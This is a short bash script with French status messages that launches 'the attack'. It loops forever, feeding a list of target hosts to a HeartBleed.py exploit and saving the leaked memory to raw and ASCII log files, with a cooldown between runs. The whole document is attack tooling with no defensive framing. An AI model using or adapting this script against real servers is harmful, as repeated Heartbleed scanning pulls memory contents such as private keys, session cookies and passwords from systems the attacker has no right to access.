
export wait=5
export time=5
echo "$0 : Lancement de l'attaque ..."
echo "Fichier de cibles : $1"
echo "Cooldown : $wait secondes"
while :
do
echo "Scan ..."
python HeartBleed.py -f "$1" -n $time -r raw_logs.txt -a ascii_logs.txt -v >> verbose.txt
echo "Fini !"
sleep 1
echo "Reprise dans $wait secondes ..."
sleep $wait
done
